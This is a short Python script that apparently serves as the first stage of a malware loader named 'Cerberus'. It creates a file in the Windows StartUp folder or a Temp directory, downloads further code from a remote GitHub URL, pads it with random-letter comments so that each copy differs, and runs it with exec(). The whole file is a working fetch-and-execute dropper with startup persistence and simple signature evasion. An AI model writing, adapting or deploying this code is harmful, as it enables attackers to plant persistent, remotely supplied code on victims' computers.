import random
import string
import os.path
import urllib.request

length = random.randrange(100,1000)
poly = True
startup = True

if startup == True:
    global path
    path = ("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp")
    
else:
    global path
    path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp")

def noise(length):
    rNoise = ""
    for i in range (0, length+1):
        rNoise = (str(rNoise) + str(random.choice(string.ascii_letters)))
    return rNoise

rN = noise(length)

if os.path.isfile((path + "/Stage1Host.py")) == False:   # Creates the Stage 1 File if it doesn't exist
    file = open((path + "/Stage1Host.py"), 'a')
    file.close()


# Retrieves code from URL and appends it into Stage1 created earlier 
with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1.txt") as retrieve:
    data = retrieve.read().decode("utf-8")
    with open((path + "/Stage1Host.py"), "a+") as file:
        file.write("#" + rN + "\n" + str(data) + "\n" + "#" + rN)

# Runs the Stage1 file
exec(open((path + "/Stage1Host.py")).read())
